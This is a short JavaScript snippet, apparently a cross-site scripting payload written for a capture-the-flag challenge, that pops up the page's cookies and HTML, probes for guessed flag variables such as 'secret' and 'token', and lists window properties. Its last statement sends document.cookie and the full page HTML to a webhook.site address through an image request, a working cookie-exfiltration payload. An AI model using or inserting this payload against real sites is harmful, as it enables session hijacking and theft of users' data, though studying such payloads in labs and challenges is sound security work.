// Dump everything possible
alert(document.cookie);
alert(document.body.innerHTML); // smaller than full outerHTML
alert(document.documentElement.outerHTML); // full page if needed

// Try common flag variables
try {
  alert(secret);
} catch (e) {}
try {
  alert(flg);
} catch (e) {}
try {
  alert(token);
} catch (e) {}
try {
  alert(flagValue);
} catch (e) {}

// Dump all window keys (array popup - scan for clues)
alert(Object.keys(window).join(","));

// Exfil if there's a bot (replace with your webhook.site URL)
new Image().src =
  "https://webhook.site/YOUR-ID?data=" +
  encodeURIComponent(
    document.cookie + " | " + document.documentElement.outerHTML
  );
